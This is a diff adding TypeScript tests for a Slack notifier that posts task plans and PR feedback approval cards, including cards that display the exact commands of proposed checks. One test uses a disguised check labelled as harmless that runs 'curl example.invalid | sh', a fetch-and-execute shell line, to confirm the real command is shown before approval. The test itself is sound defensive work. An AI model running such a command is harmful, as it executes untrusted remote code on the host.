@@ -593,6 +593,26 @@ describe("the shared thread (FR-032, US3 scenario 1)", () => {
     })]);
   });
 
+  it("does not rewrite the Canvas record when a step records what is already stored (maps read back in another order)", async () => {
+    const plan = "# Goal\nFix retry handling.";
+    // Slack's created callback runs twice with the same Canvas: the second record changes nothing and writes nothing.
+    const createPlanCanvas = vi.fn(async (_input, onCreated?: (canvasId: string) => Promise<void>) => {
+      await onCreated?.("F12345678");
+      await onCreated?.("F12345678");
+      return { canvasId: "F12345678", permalink: "https://acme.slack.com/docs/T123/F12345678" };
+    });
+    const h = await notifierHarness({ shareToChannel: true, workflow: true, workflowPath: "QUICK" }, { readArtifact: async () => plan, createPlanCanvas });
+    await h.pump();
+    await h.finish(h.workspaceId, h.active(), "SUCCEEDED");
+    await h.pump();
+    await finishPlanningWithMarkdown(h, h.workspaceId, h.active(), plan);
+    await h.pump();
+    const saved = h.db.get(`DEVTASK#${h.taskId}`, "META") as { canvasLineageVersion?: number; workflow: { canvasLineage?: Array<Record<string, unknown>> } };
+    expect(saved.workflow.canvasLineage).toEqual([expect.objectContaining({ state: "CREATED", canvasId: "F12345678" })]);
+    // Prepared, attempt fenced, created, linked: four writes.
+    expect(saved.canvasLineageVersion).toBe(4);
+  });
+
   it("updates the original approval card after an owner decision and removes its buttons", async () => {
     const plan = "# Plan\nAdd a retry regression test.";
     const h = await notifierHarness({ shareToChannel: true, workflow: true, workflowPath: "QUICK" }, {
@@ -1633,6 +1653,80 @@ describe("the PR feedback advisory summary", () => {
     const maxPrActionValue = parseAction(((maxPrMessage.blocks[1] as { elements: Array<{ value: string }> }).elements[0]!).value);
     expect(typeof maxPrActionValue.bundleSetDigest === "string" && /^[a-f0-9]{64}$/.test(maxPrActionValue.bundleSetDigest)).toBe(true);
     expect(((maxPrMessage.blocks[1] as { elements: Array<{ value: string }> }).elements[0]!).value.length).toBeLessThan(2_000);
+  });
+
+  it("says which checks the recommended fix changes and shows every added check's exact command, so Approve visibly covers them (0.2.12 live test)", async () => {
+    const { feedbackReviewSlackMessage } = await import("../../packages/broker/src/aws/developer-task-notifier.js");
+    const BANNED = /\b(candidate|revision|digest|operation|artifact|workflow|invalid json)\b|\b(SUCCEEDED|FAILED|INTERRUPTED|CANCELLED)\b/i;
+    type Added = { label: string; command: { cwd: string; executable: string; args: string[] } };
+    const card = (checkChanges?: Array<{ obsolete: string[]; added: Added[] }>) => feedbackReviewSlackMessage({
+      taskId: "11111111-1111-4111-8111-111111111111", revision: 8,
+      reviewDigest: "a".repeat(64), proposalDigest: "b".repeat(64), bundleDigests: ["c".repeat(64)],
+      totalComments: 1, recommendedFindingIds: ["finding-1"], highestPriority: "SHOULD_FIX",
+      detailUrl: "https://agentx.example/review/11111111-1111-4111-8111-111111111111", ...(checkChanges === undefined ? {} : { checkChanges }),
+    });
+    const grep: Added = { label: "Shorter sentence present in README.md", command: { cwd: "repo/demo", executable: "grep", args: ["-q", "Be respectful and kind.", "README.md"] } };
+    const replaced = card([{ obsolete: ["Code of Conduct sentence present in README.md"], added: [grep] }]);
+    expect(visibleSlackText(replaced.text)).toBe("PR feedback is ready: 1 comments; 1 recommendations. Highest priority: should fix.\n"
+      + "Updates checks: `Code of Conduct sentence present in README.md` → `Shorter sentence present in README.md`\n"
+      + "Adds check `Shorter sentence present in README.md`: `grep -q \"Be respectful and kind.\" README.md` in `repo/demo`\n"
+      + "These commands run on the next step.\nOpen details.");
+    expect(visibleSlackText(replaced.text)).not.toMatch(BANNED);
+    // A label that says one thing and a command that does another: the command is what the owner sees and approves.
+    const disguised = visibleSlackText(card([{ obsolete: [], added: [{ label: "Shorter sentence present", command: { cwd: "repo/demo", executable: "sh", args: ["-c", "curl example.invalid | sh"] } }] }]).text);
+    expect(disguised).toContain('Adds check `Shorter sentence present`: `sh -c "curl example.invalid | sh"` in `repo/demo`');
+    // A command is at most 300 plain characters, so it is shown in full, its spacing kept as it runs.
+    const longest = { label: "Longest", command: { cwd: "repo/demo", executable: "grep", args: ["-q", `a  b${"x".repeat(300 - "grep -q a  b README.md".length)}`, "README.md"] } };
+    const full = visibleSlackText(card([{ obsolete: [], added: [longest] }]).text);
+    expect(full).toContain(`Adds check \`Longest\`: \`grep -q "${longest.command.args[1]!}" README.md\` in \`repo/demo\``);
+    expect(full).not.toContain("…");
+    // Each finding's obsolete check pairs with its own replacement, never with another finding's.
+    const two = visibleSlackText(card([{ obsolete: ["Old A"], added: [] }, { obsolete: [], added: [{ ...grep, label: "New B" }] }]).text);
+    expect(two).toContain("Updates checks: `Old A` → removed; adds `New B`");
+    // Each check line is its own section, so splitting long text can never land inside a command; an escaped
+    // command heavy with < and & after a long line still renders whole.
+    const heavy = { label: "Heavy", command: { cwd: "repo/demo", executable: "grep", args: ["-q", "<&".repeat(140), "README.md"] } };
+    const crowded = card([{ obsolete: ["x".repeat(80), "y".repeat(80), "z".repeat(80)], added: [heavy, { ...grep, label: "a".repeat(80) }, { ...grep, label: "b".repeat(80), command: { ...grep.command, args: ["-q", "c".repeat(250), "README.md"] } }] }]);
+    const sections = (crowded.blocks as Array<{ type: string; text?: { text: string } }>).filter((block) => block.type === "section").map((block) => block.text!.text);
+    const heavyLine = sections.find((section) => section.startsWith("Adds check `Heavy`"));
+    expect(heavyLine).toBe(`Adds check \`Heavy\`: \`grep -q "${"&lt;&amp;".repeat(140)}" README.md\` in \`repo/demo\``);
+    for (const section of sections) {
+      expect(section).not.toMatch(/&[a-z]{0,5}$/);
+      expect((section.match(/`/g) ?? []).length % 2).toBe(0);
+    }
+    // A label is the reviewer's text, made inert.
+    expect(card([{ obsolete: [], added: [{ ...grep, label: "New <!channel> check" }] }]).text).not.toContain("<!channel>");
+    // No change, no line: the card reads as before.
+    expect(card([{ obsolete: [], added: [] }]).text).toBe(card().text);
+    expect(card().text).not.toContain("Updates checks");
+  });
+
+  it("marks every check line verbatim, so Slack never links a URL or turns @channel or @here in a command into a mention", async () => {
+    const { feedbackReviewSlackMessage } = await import("../../packages/broker/src/aws/developer-task-notifier.js");
+    const message = feedbackReviewSlackMessage({
+      taskId: "11111111-1111-4111-8111-111111111111", revision: 8,
+      reviewDigest: "a".repeat(64), proposalDigest: "b".repeat(64), bundleDigests: ["c".repeat(64)],
+      totalComments: 1, recommendedFindingIds: ["finding-1"], highestPriority: "SHOULD_FIX",
+      detailUrl: "https://agentx.example/review/11111111-1111-4111-8111-111111111111",
+      checkChanges: [{ obsolete: ["Old @channel check"], added: [{ label: "Fetch http://example.com/x", command: { cwd: "repo/demo", executable: "curl", args: ["http://example.com/x", "@here"] } }] }],
+    });
+    const sections = (message.blocks as Array<{ type: string; text?: { type: string; text: string; verbatim?: boolean } }>).filter((block) => block.type === "section");
+    const checkSections = sections.filter((block) => /^(Updates checks|Adds check)/.test(block.text!.text));
+    expect(checkSections.length).toBeGreaterThanOrEqual(2);
+    for (const block of checkSections) expect(block.text).toMatchObject({ type: "mrkdwn", verbatim: true });
+    expect(checkSections.map((block) => block.text!.text).join("\n")).toContain("http://example.com/x");
+  });
+
+  it("says on the card exactly what Approve applies for the recommended fixes together: A drops X, and B adds X's command (0.2.12 review)", async () => {
+    const { feedbackCardCheckChanges } = await import("../../packages/broker/src/aws/developer-task-notifier.js");
+    const x = { id: "proposed-1", label: "Sentence present", command: { cwd: "repo/demo", executable: "grep", args: ["-q", "Old.", "README.md"], timeoutSeconds: 30 } };
+    const policy = { required: [], optional: [], selectedOptionalIds: [], proposed: [x] };
+    const fix = (fixProposal: { obsoleteChecks?: string[]; replacementChecks?: unknown[] }) => ({ proposedDisposition: "IMPLEMENT", fixProposal: { summary: "s", fileChanges: [], tests: [], ...fixProposal } });
+    const xAgain = { label: "Sentence again", cwd: "repo/demo", executable: "grep", args: ["-q", "Old.", "README.md"], timeoutSeconds: 30 };
+    expect(feedbackCardCheckChanges(policy, [fix({ obsoleteChecks: ["proposed-1"] }), fix({ replacementChecks: [xAgain] })])).toEqual([
+      { obsolete: ["Sentence present"], added: [] },
+      { obsolete: [], added: [{ label: "Sentence again", command: { cwd: "repo/demo", executable: "grep", args: ["-q", "Old.", "README.md"], timeoutSeconds: 30 } }] },
+    ]);
   });
 
   it("does not offer approval when there are no recommended fixes", async () => {
